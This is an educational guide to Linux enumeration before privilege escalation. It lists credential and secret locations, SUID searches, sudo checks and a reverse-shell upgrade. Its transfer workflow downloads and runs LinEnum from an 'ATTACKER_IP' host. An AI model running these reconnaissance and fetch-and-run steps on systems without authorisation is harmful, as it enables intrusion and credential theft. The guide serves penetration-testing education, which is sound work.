# Linux Enumeration for Privilege Escalation

## What You Will Learn

In this guide, you'll learn:

* Why enumeration is the most important step before privilege escalation
* What information should be collected from a Linux system
* Common Linux commands used during manual enumeration
* How automated enumeration tools work
* Best practices and safety considerations when using enumeration scripts

> **Note:** These techniques are intended for cybersecurity education, penetration testing, and defensive security assessments. Only perform them on systems you own or have permission to test.

---

# What is Enumeration?

**Enumeration** is the process of collecting information about a target system.

Think of it like investigating a crime scene before taking any action.

Instead of immediately trying exploits, you first learn:

* What operating system is running?
* Which users exist?
* What services are running?
* What software is installed?
* Are there any misconfigurations?

The more information you collect, the easier it becomes to identify possible privilege escalation paths.

---

# Why is Enumeration Important?

Enumeration is **always the first step** in privilege escalation.

Without understanding the system, it's difficult to know which vulnerabilities or misconfigurations can be exploited.

Good enumeration helps you:

* Understand the operating system
* Identify security weaknesses
* Find misconfigurations
* Choose the correct exploit
* Avoid wasting time trying exploits that won't work

Think of enumeration as creating a **map of the system** before exploring it.

```text
Target Machine
       │
       ▼

Collect Information
       │
       ▼

Identify Weaknesses
       │
       ▼

Choose the Correct Exploit
       │
       ▼

Privilege Escalation
```

---

# What Should You Enumerate?

A Linux system contains many components that may reveal privilege escalation opportunities.

Let's look at the most important ones.

---

# 1. Hardware Architecture

Your exploit must match the target system's CPU architecture.

Common architectures include:

* x86 (32-bit)
* x86_64 (64-bit)
* ARM

For example:

```text
Architecture:

x86_64
```

Trying to run a 64-bit exploit on a 32-bit machine will fail.

---

# 2. Kernel Version

The Linux kernel controls communication between software and hardware.

Many privilege escalation vulnerabilities only affect **specific kernel versions**.

Example:

```text
Linux 5.15.0
```

Knowing the kernel version allows you to search for known vulnerabilities (CVEs).

---

# 3. Linux Distribution

Different Linux distributions package software differently.

Examples include:

* Ubuntu
* Debian
* Kali Linux
* Fedora
* Arch Linux

Example:

```text
Ubuntu 22.04
```

Some vulnerabilities only exist on certain distributions or software packages.

---

# 4. Users and Groups

Understanding user accounts is extremely important.

Questions to answer include:

* Who am I?
* Which users exist?
* Which groups do I belong to?

Some groups have powerful privileges.

For example, membership in the **docker** group can often lead to root access because Docker containers can interact closely with the host system.

---

# 5. Sudo Permissions

Sudo allows users to execute commands with elevated privileges.

Sometimes systems are misconfigured, allowing users to execute commands as root without entering a password.

Example:

```text
User

↓

Allowed to run:

ALL COMMANDS

↓

No Password Required

↓

Root Access
```

This is one of the easiest privilege escalation opportunities to identify.

---

# 6. Important Directories

Certain directories commonly contain useful information.

## `/home`

Look for:

* SSH keys
* Configuration files
* Scripts
* Sensitive documents

---

## `/opt`

Many administrators install custom applications here.

You may find:

* Backup files
* Custom binaries
* Configuration files

---

## `/var/www/html`

If the machine runs a web server, this directory usually contains the website's source code.

Possible discoveries include:

* Database credentials
* API keys
* Configuration files
* Hidden files

---

## `/tmp`

The temporary directory is writable by many users.

It often contains:

* Temporary scripts
* Installer files
* Leftover application data

---

# 7. SUID and SGID Binaries

Some programs have special permissions that allow them to run with elevated privileges.

These are called:

* **SUID (Set User ID)**
* **SGID (Set Group ID)**

If a vulnerable or poorly written SUID/SGID program exists, it may be abused to gain higher privileges.

---

# 8. Local Services

Not every service is accessible from the internet.

Some applications only listen on:

```text
127.0.0.1
```

These are called **local services**.

Examples include:

* Development servers
* Debug applications
* Internal dashboards
* Databases

Although remote users cannot access them directly, someone with shell access may be able to interact with them locally.

---

# 9. Network Interfaces

Understanding the machine's network connections is important.

Questions to ask include:

* Does the machine have multiple network interfaces?
* Is it connected to an internal network?
* Can it reach systems that you cannot?

Sometimes a compromised server becomes a **pivot point** for accessing other internal machines.

---

# 10. Installed Software

Every installed program is a potential attack surface.

Look for:

* Software names
* Versions
* Known vulnerabilities (CVEs)

Example:

```text
Apache 2.4.49
```

Older versions may contain publicly known security vulnerabilities.

---

# 11. Running Processes

Processes show what programs are currently running.

Useful information includes:

* Services running as root
* Background applications
* Scheduled tasks
* Security software

Sometimes you may discover applications running with unnecessary privileges.

---

# 12. Backup Files

Administrators often create backup copies of important files.

Examples include:

```text
config.bak

database.sql

backup.zip
```

These files may contain sensitive information that has been forgotten.

---

# 13. Password Databases

Developers sometimes leave password managers on servers.

One common format is:

```text
.kdbx
```

This is the database format used by KeePass.

If discovered, it may contain usernames, passwords, or API keys.

---

# 14. Git Repositories

Finding a `.git` directory can be extremely valuable.

Git stores the complete project history.

Even if developers delete passwords later, older commits may still contain them.

Possible discoveries include:

* API keys
* Passwords
* Database credentials
* Secrets accidentally committed

---

# 15. Cron Jobs

Cron jobs automatically execute commands on a schedule.

Example:

```text
Every Hour

↓

Run backup.sh
```

Poorly configured cron jobs may allow attackers to modify scripts that are later executed with elevated privileges.

---

# 16. Linux Capabilities

Linux capabilities provide specific privileges to programs without giving them full root access.

If misconfigured, they may allow privilege escalation.

Capabilities are often safer than SUID binaries but should still be inspected during enumeration.

---

# 17. Environment Variables

Applications sometimes store sensitive information inside environment variables.

Examples include:

* Passwords
* API tokens
* Database credentials
* Secret keys

Always inspect them during enumeration.

---

# Manual Enumeration Commands

The following commands are commonly used to collect information.

---

## Upgrade to an Interactive Shell

A reverse shell often provides only a basic terminal.

Upgrade it using:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

This creates a proper interactive Bash shell.

---

## System Information

Display kernel version and architecture:

```bash
uname -a
```

---

Display executable search paths:

```bash
echo $PATH
```

---

Display environment variables:

```bash
env
```

---

# User Enumeration

Display the current user:

```bash
whoami
```

---

List all users:

```bash
cat /etc/passwd
```

---

Extract only usernames:

```bash
cat /etc/passwd | cut -d: -f1 > users.txt
```

This command:

* Uses `:` as the separator (`-d:`)
* Extracts the first field (`-f1`)
* Saves usernames into `users.txt`

---

Show your groups:

```bash
groups
```

---

Display all groups:

```bash
cat /etc/group
```

---

Extract only group names:

```bash
cat /etc/group | cut -d: -f1 > groups.txt
```

---

# Check Sudo Permissions

Display your sudo privileges:

```bash
sudo -l
```

This shows:

* Which commands you can execute
* Whether a password is required
* Which user you can execute them as

---

# Explore the File System

List files:

```bash
ls
```

---

Display directory structures:

```bash
tree
```

> **Note:** The `tree` command is useful but is not installed by default on many Linux systems.

---

Look for SSH keys:

```text
~/.ssh/
```

Private SSH keys may provide access to other systems.

---

# Find SUID Binaries

Search the system:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Explanation:

* `-perm -u=s` → Find SUID files
* `-type f` → Only files
* `2>/dev/null` → Hide "Permission denied" errors

---

# Find SGID Binaries

```bash
find / -perm -g=s -type f 2>/dev/null
```

---

# Network Enumeration

Display network interfaces:

```bash
ip a
```

This shows:

* IP addresses
* Network interfaces
* MAC addresses

---

Display listening TCP services:

```bash
netstat -lpnt
```

---

Display listening UDP services:

```bash
netstat -lpnu
```

If run with sufficient privileges, these commands may also display the process names associated with each listening port.

---

# Search for Backup Files

Find backup files:

```bash
find / -name "*.bak"
```

---

Search for KeePass databases:

```bash
find / -name "*.kdbx"
```

---

# Automated Enumeration Tools

Manual enumeration is important, but it can be time-consuming.

Several tools automatically perform many of these checks.

Popular examples include:

* **LinPEAS**
* **LinEnum**

These tools collect information about:

* Users
* Groups
* Sudo permissions
* SUID binaries
* Installed software
* Running services
* Network configuration
* Interesting files
* Environment variables
* Possible privilege escalation opportunities

---

# Typical File Transfer Workflow

A common workflow is:

## Step 1 – Download the Script

Download the enumeration script to your own machine.

Example:

```text
LinEnum.sh
```

---

## Step 2 – Host the File

Start a simple HTTP server:

```bash
python3 -m http.server 1237
```

---

## Step 3 – Download from the Target

Retrieve the script on the target machine:

```bash
wget http://ATTACKER_IP:1237/LinEnum.sh
```

---

## Step 4 – Make It Executable

```bash
chmod +x LinEnum.sh
```

---

## Step 5 – Execute the Script

Run the script while saving the output:

```bash
./LinEnum.sh | tee linenum_output.txt
```

The `tee` command:

* Displays the output on the screen
* Saves a copy to `linenum_output.txt`

This allows you to review the results later.

---

# Safety and Best Practices

When using automated enumeration tools:

* Understand what each command does instead of relying entirely on automation.
* Review the output carefully rather than assuming every finding is exploitable.
* Be cautious when running large scripts on production systems, as they may generate significant activity or unexpected load.
* During certifications such as the **OSCP**, enumeration scripts are generally permitted, but tools that automatically exploit vulnerabilities are typically prohibited. Always follow the rules of the specific exam or engagement.

---

# Key Takeaways

* Enumeration is the **foundation** of privilege escalation.
* Gather as much information as possible **before** attempting exploitation.
* Focus on users, groups, sudo permissions, kernel version, installed software, SUID/SGID binaries, services, network configuration, and sensitive files.
* Use manual commands to understand the system and verify findings.
* Automated tools like **LinPEAS** and **LinEnum** can speed up the process, but understanding the results is more important than simply running the tools.
* Good enumeration saves time and helps identify the most effective path to privilege escalation.
